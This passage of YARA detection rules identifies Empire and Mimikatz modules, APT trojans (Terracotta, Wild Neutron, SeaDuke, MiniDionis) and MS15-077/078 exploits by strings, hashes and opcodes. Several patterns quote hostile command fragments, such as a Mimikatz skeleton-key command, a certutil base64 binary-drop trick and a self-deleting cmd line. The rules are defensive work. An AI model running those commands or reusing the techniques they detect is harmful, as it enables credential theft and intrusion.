\"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 11:33:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001, T1098_004, T1547_008\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"script += \\\"Invoke-Mimikatz -Command '\\\\\\\"\\\" + command + \\\"\\\\\\\"';\\\"\" fullword ascii\n      $s2 = \"script += '\\\"Skeleton key implanted. Use password \\\\'mimikatz\\\\' for access.\\\"'\" fullword ascii\n      $s3 = \"command = \\\"misc::skeleton\\\"\" fullword ascii\n      $s4 = \"\\\"ONLY APPLICABLE ON DOMAIN CONTROLLERS!\\\"),\" fullword ascii\n   condition: \n      filesize < 6KB and 2 of them\n}\n\nrule Empire_invoke_wmi_RID2E0A : DEMO SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file invoke_wmi.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 10:57:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]\" fullword ascii\n      $s2 = \"script += \\\";'Invoke-Wmi executed on \\\" +computerNames +\\\"'\\\"\" fullword ascii\n      $s3 = \"script = \\\"$PSPassword = \\\\\\\"\\\"+password+\\\"\\\\\\\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Man\" ascii\n   condition: \n      filesize < 20KB and 2 of them\n}\n\nrule Apolmy_Privesc_Trojan_RID2F8B : APT DEMO EXE FILE T1068 {\n   meta:\n      description = \"Apolmy Privilege Escalation Trojan used in APT Terracotta\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 12:01:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%d] Failed, %08X\" fullword ascii\n      $s2 = \"[%d] Offset can not fetched.\" fullword ascii\n      $s3 = \"PowerShadow2011\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Mithozhan_Trojan_RID2D90 : APT DEMO EXE FILE {\n   meta:\n      description = \"Mitozhan Trojan used in APT Terracotta\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:37:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"adbrowser\" fullword wide\n      $s2 = \"IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==\" fullword ascii\n      $s3 = \"EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule RemoteExec_Tool_RID2CFF : APT DEMO EXE FILE {\n   meta:\n      description = \"Remote Access Tool used in APT Terracotta\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.exe /q /c \\\"%s\\\"\" fullword ascii\n      $s1 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n      $s2 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n      $s3 = \"\\\\\\\\.\\\\pipe\\\\TermHlp_communicaton\" fullword ascii\n      $s4 = \"TermHlp_stdout\" fullword ascii\n      $s5 = \"TermHlp_stdin\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 75KB and 4 of ( $s* )\n}\n\nrule LiuDoor_Malware_1_RID2D87 : APT DEMO EXE FILE {\n   meta:\n      description = \"Liudoor Trojan used in Terracotta APT\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:35:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"deed6e2a31349253143d4069613905e1dfc3ad4589f6987388de13e33ac187fc\"\n      hash2 = \"4575e7fc8f156d1d499aab5064a4832953cd43795574b4c7b9165cdc92993ce5\"\n      hash3 = \"ad1a507709c75fe93708ce9ca1227c5fefa812997ed9104ff9adfec62a3ec2bb\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"svchostdllserver.dll\" fullword ascii\n      $s2 = \"SvcHostDLL: RegisterServiceCtrlHandler %S failed\" fullword ascii\n      $s3 = \"\\\\nbtstat.exe\" ascii\n      $s4 = \"DataVersionEx\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule LiuDoor_Malware_2_RID2D88 : APT DEMO EXE FILE {\n   meta:\n      description = \"Liudoor Trojan used in Terracotta APT\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n      date = \"2015-08-04 10:35:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f3fb68b21490ded2ae7327271d3412fbbf9d705c8003a195a705c47c98b43800\"\n      hash2 = \"e42b8385e1aecd89a94a740a2c7cd5ef157b091fabd52cd6f86e47534ca2863e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"svchostdllserver.dll\" fullword ascii\n      $s1 = \"Lpykh~mzCCRv|mplpykCCHvq{phlCC\\\\jmmzqkIzmlvpqCC\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule MAL_MiniDionis_VBS_Dropped_RID30B4 : DEMO MAL SCRIPT {\n   meta:\n      description = \"Dropped File - 1.vbs\"\n      author = \"Florian Roth\"\n      reference = \"https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/\"\n      date = \"2015-07-21 12:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wscript.Sleep 5000\" ascii\n      $s2 = \"Set FSO = CreateObject(\\\"Scripting.FileSystemObject\\\")\" ascii\n      $s3 = \"Set WshShell = CreateObject(\\\"WScript.Shell\\\")\" ascii\n      $s4 = \"If(FSO.FileExists(\\\"\" ascii\n      $s5 = \"then FSO.DeleteFile(\\\".\\\\\" ascii\n   condition: \n      filesize < 1KB and all of them and $s1 in ( 0 .. 40 )\n}\n\nrule Exploit_MS15_077_078_RID2D56 : DEMO EXE EXPLOIT FILE GEN T1189 {\n   meta:\n      description = \"MS15-078 / MS15-077 exploit - generic signature\"\n      author = \"Florian Roth\"\n      reference = \"https://code.google.com/p/google-security-research/issues/detail?id=473&can=1&start=200\"\n      date = \"2015-07-21 10:27:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"18e3e840a5e5b75747d6b961fca66a670e3faef252aaa416a88488967b47ac1c\"\n      hash2 = \"0b5dc030e73074b18b1959d1cf7177ff510dbc2a0ec2b8bb927936f59eb3d14d\"\n      hash3 = \"fc609adef44b5c64de029b2b2cff22a6f36b6bdf9463c1bd320a522ed39de5d9\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, GEN, T1189\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GDI32.DLL\" fullword ascii\n      $s2 = \"atmfd.dll\" fullword wide\n      $s3 = \"AddFontMemResourceEx\" fullword ascii\n      $s4 = \"NamedEscape\" fullword ascii\n      $s5 = \"CreateBitmap\" fullword ascii\n      $s6 = \"DeleteObject\" fullword ascii\n      $op0 = { 83 45 e8 01 eb 07 c7 45 e8 } \n      $op1 = { 8d 85 24 42 fb ff 89 04 24 e8 80 22 00 00 c7 45 } \n      $op2 = { eb 54 8b 15 6c 00 4c 00 8d 85 24 42 fb ff 89 44 } \n      $op3 = { 64 00 88 ff 84 03 70 03 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 5 of ( $s* ) or 3 of ( $op* )\n}\n\nrule Exploit_MS15_077_078_HackingTeam_RID31F1 : DEMO EXE EXPLOIT FILE T1189 {\n   meta:\n      description = \"MS15-078 / MS15-077 exploit - Hacking Team code\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-07-21 13:44:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ad6bb982a1ecfe080baf0a2b27950f989c107949b1cf02b6e0907f1a568ece15\"\n      hash2 = \"fc609adef44b5c64de029b2b2cff22a6f36b6bdf9463c1bd320a522ed39de5d9\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, T1189\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\SystemRoot\\\\system32\\\\CI.dll\" ascii\n      $s2 = \"\\\\sysnative\\\\CI.dll\" ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36\" fullword ascii\n      $s4 = \"CRTDLL.DLL\" fullword ascii\n      $s5 = \"\\\\sysnative\" ascii\n      $s6 = \"InternetOpenA coolio, trying open %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 5 of them\n}\n\nrule MAL_Malicious_SFX1_Voicemail_RID3169 : DEMO FILE MAL {\n   meta:\n      description = \"SFX with voicemail content\"\n      author = \"Florian Roth\"\n      reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n      date = \"2015-07-20 13:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"voicemail\" ascii\n      $s1 = \".exe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 1000KB and $s0 in ( 3 .. 80 ) and $s1 in ( 3 .. 80 )\n}\n\nrule MAL_MiniDionis_readerView_RID30AA : DEMO EXE FILE MAL {\n   meta:\n      description = \"MiniDionis Malware - file readerView.exe / adobe.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n      date = \"2015-07-20 12:49:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145\"\n      hash2 = \"a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004\"\n      hash3 = \"88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%ws_out%ws\" fullword wide\n      $s2 = \"dnlibsh\" fullword ascii\n      $op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } \n      $op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } \n      $op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of ( $s* ) and 1 of ( $op* )\n}\n\nrule MAL_Malicious_SFX2_Adobe_RID2FAC : DEMO EXE FILE MAL {\n   meta:\n      description = \"SFX with adobe.exe content\"\n      author = \"Florian Roth\"\n      reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n      date = \"2015-07-20 12:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"adobe.exe\" fullword ascii\n      $s2 = \"Extracting files to %s folder$Extracting files to temporary folder\" fullword wide\n      $s3 = \"GETPASSWORD1\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule AppInitHook_RID2B57 : DEMO EXE FILE HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook_RID2B57.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/subTee/AppInitGlobalHooks-Mimikatz\"\n      date = \"2015-07-15 09:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, EXE, FILE, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Release\\\\AppInitHook_RID2B57.pdb\" ascii\n      $s1 = \"AppInitHook_RID2B57.dll\" fullword ascii\n      $s2 = \"mimikatz.exe\" fullword wide\n      $s3 = \"]X86Instruction->OperandSize >= Operand->Length\" fullword wide\n      $s4 = \"mhook\\\\disasm-lib\\\\disasm.c\" fullword wide\n      $s5 = \"mhook\\\\disasm-lib\\\\disasm_x86.c\" fullword wide\n      $s6 = \"VoidFunc\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule Binary_Drop_Certutil_RID2F15 : DEMO SUSP T1132_001 T1140 {\n   meta:\n      description = \"Drop binary as base64 encoded cert trick\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/mattifestation/47f9e8a431f96a266522\"\n      date = \"2015-07-15 11:42:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, SUSP, T1132_001, T1140\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo -----BEGIN CERTIFICATE----- >\" ascii\n      $s1 = \"echo -----END CERTIFICATE----- >>\" ascii\n      $s2 = \"certutil -decode \" ascii\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule MAL_SeaDuke_Sample_RID2DAD : DEMO EXE FILE MAL {\n   meta:\n      description = \"SeaDuke Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2015/07/unit-42-technical-analysis-seaduke/\"\n      date = \"2015-07-14 10:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"bpython27.dll\" fullword ascii\n      $s1 = \"email.header(\" ascii\n      $s2 = \"LogonUI.exe\" fullword wide\n      $s3 = \"Crypto.Cipher.AES(\" ascii\n      $s4 = \"mod is NULL - %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule WildNeutron_Sample_1_RID2EDD : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:32:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LiveUpdater.exe\" fullword wide\n      $s1 = \"id-at-postalAddress\" fullword ascii\n      $s2 = \"%d -> %d (default)\" fullword wide\n      $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s8 = \"id-ce-keyUsage\" fullword ascii\n      $s9 = \"Key Usage\" fullword ascii\n      $s32 = \"UPDATE_ID\" fullword wide\n      $s37 = \"id-at-commonName\" fullword ascii\n      $s38 = \"2008R2\" fullword wide\n      $s39 = \"RSA-alt\" fullword ascii\n      $s40 = \"%02d.%04d.%s\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule WildNeutron_Sample_2_RID2EDE : APT DEMO EXE FILE T1218_011 {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:32:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide\n      $s1 = \"IgfxUpt.exe\" fullword wide\n      $s2 = \"id-at-postalAddress\" fullword ascii\n      $s3 = \"Intel(R) Common User Interface\" fullword wide\n      $s4 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s11 = \"Key Usage\" fullword ascii\n      $s12 = \"Intel Integrated Graphics Updater\" fullword wide\n      $s13 = \"%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule WildNeutron_Sample_4_RID2EE0 : APT DEMO EXE FILE T1218_011 {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WinRAT-Win32-Release.exe\" fullword ascii\n      $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide\n      $s1 = \"RtlUpd.EXE\" fullword wide\n      $s2 = \"RtlUpd.exe\" fullword wide\n      $s3 = \"Driver Update and remove for Windows x64 or x86_32\" fullword wide\n      $s4 = \"Realtek HD Audio Update and remove driver Tool\" fullword wide\n      $s5 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s6 = \"Key Usage\" fullword ascii\n      $s7 = \"id-at-serialNumber\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1240KB and all of them\n}\n\nrule WildNeutron_Sample_5_RID2EE1 : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LiveUpdater.exe\" fullword wide\n      $s1 = \"id-at-postalAddress\" fullword ascii\n      $s2 = \"%d -> %d (default)\" fullword wide\n      $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s4 = \"sha-1WithRSAEncryption\" fullword ascii\n      $s5 = \"Postal code\" fullword ascii\n      $s6 = \"id-ce-keyUsage\" fullword ascii\n      $s7 = \"Key Usage\" fullword ascii\n      $s8 = \"TLS-RSA-WITH-3DES-EDE-CBC-SHA\" fullword ascii\n      $s9 = \"%02d.%04d.%s\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule WildNeutron_Sample_6_RID2EE2 : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"mshtaex.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 310KB and all of them\n}\n\nrule WildNeutron_Sample_7_RID2EE3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"checking match for '%s' user %s host %s addr %s\" fullword ascii\n      $s1 = \"PEM_read_bio_PrivateKey failed\" fullword ascii\n      $s2 = \"usage: %s [-ehR] [-f log_facility] [-l log_level] [-u umask]\" fullword ascii\n      $s3 = \"%s %s for %s%.100s from %.200s port %d%s\" fullword ascii\n      $s4 = \"clapi32.dll\" fullword ascii\n      $s5 = \"Connection from %s port %d\" fullword ascii\n      $s6 = \"/usr/etc/ssh_known_hosts\" fullword ascii\n      $s7 = \"Version: %s - %s %s %s %s\" fullword ascii\n      $s8 = \"[-] connect()\" fullword ascii\n      $s9 = \"/bin/sh /usr/etc/sshrc\" fullword ascii\n      $s10 = \"kexecdhs.c\" fullword ascii\n      $s11 = \"%s: setrlimit(RLIMIT_FSIZE, { 0, 0 }): %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule WildNeutron_Sample_9_RID2EE5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:34:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://get.adobe.com/flashplayer/\" wide\n      $s4 = \" Player Installer/Uninstaller\" fullword wide\n      $s5 = \"Adobe Flash Plugin Updater\" fullword wide\n      $s6 = \"uSOFTWARE\\\\Adobe\" fullword wide\n      $s11 = \"2008R2\" fullword wide\n      $s12 = \"%02d.%04d.%s\" fullword wide\n      $s13 = \"%d -> %d\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1477KB and all of them\n}\n\nrule WildNeutron_Sample_10_RID2F0D : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:40:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $n1 = \"/c for /L %%i in (1,1,2) DO ping 127.0.0.1 -n 3 & type %%windir%%\\\\notepad.exe > %s & del /f %s\" fullword ascii\n      $s1 = \"%SYSTEMROOT%\\\\temp\\\\_dbg.tmp\" fullword ascii\n      $s2 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mspool.dll\" fullword ascii\n      $s3 = \"%SYSTEMROOT%\\\\System32\\\\dpcore16t.dll\" fullword ascii\n      $s4 = \"%SYSTEMROOT%\\\\System32\\\\wdigestEx.dll\" fullword ascii\n      $s5 = \"%SYSTEMROOT%\\\\System32\\\\mspool.dll\" fullword ascii\n      $s6 = \"%SYSTEMROOT%\\\\System32\\\\kernel32.dll\" fullword ascii\n      $s7 = \"%SYSTEMROOT%\\\\SysWOW64\\\\iastor32.exe\" fullword ascii\n      $s8 = \"%SYSTEMROOT%\\\\System32\\\\msvcse.exe\" fullword ascii\n      $s9 = \"%SYSTEMROOT%\\\\System32\\\\mshtaex.exe\" fullword ascii\n      $s10 = \"%SYSTEMROOT%\\\\System32\\\\iastor32.exe\" fullword ascii\n      $s11 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mshtaex.exe\" fullword ascii\n      $x1 = \"wdigestEx.dll\" fullword ascii\n      $x2 = \"dpcore16t.dll\" fullword ascii\n      $x3 = \"mspool.dll\" fullword ascii\n      $x4 = \"msvcse.exe\" fullword ascii\n      $x5 = \"mshtaex.exe\" fullword wide\n      $x6 = \"iastor32.exe\" fullword ascii\n      $y1 = \"Installer.exe\" fullword ascii\n      $y2 = \"Info: Process %s\" fullword ascii\n      $y3 = \"Error: GetFileTime %s 0x%x\" fullword ascii\n      $y4 = \"Install succeeded\" fullword ascii\n      $y5 = \"Error: RegSetValueExA 0x%x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( $n1 or ( 1 of ( $s* ) and 1 of ( $x* ) and 3 of ( $y* ) ) )\n}\n\nrule APT_MAL_WildNeutron_javacpl_RID3149 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 13:16:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"683f5b476f8ffe87ec22b8bab57f74da4a13ecc3a5c2cbf951999953c2064fc9\"\n      hash2 = \"758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92\"\n      hash3 = \"8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!\" ascii fullword\n      $s2 = \"cmdcmdline\" wide fullword\n      $s3 = \"\\\"%s\\\" /K %s\" wide fullword\n      $s4 = \"Process is not running any more\" wide fullword\n      $s5 = \"dpnxfsatz\" wide fullword\n      $op1 = { ff d6 50 ff 15 ?? ?? 43 00 8b f8 85 ff 74 34 83 64 24 0c 00 e8 ?? ?? 02 00 } \n      $op2 = { b8 02 00 00 00 01 45 80 01 45 88 6a 00 47 52 89 7d 8c 03 d8 } \n      $op3 = { 8b c7 f7 f6 46 89 b5 c8 fd ff ff 0f b7 c0 8b c8 0f af ce 3b cf } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5MB and ( all of ( $s* ) or all of ( $op* ) )\n}\n\nrule whosthere_alt_RID2C8A : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 09:53:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii\n      $s1 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii\n      $s2 = \"dump output to a file, -o 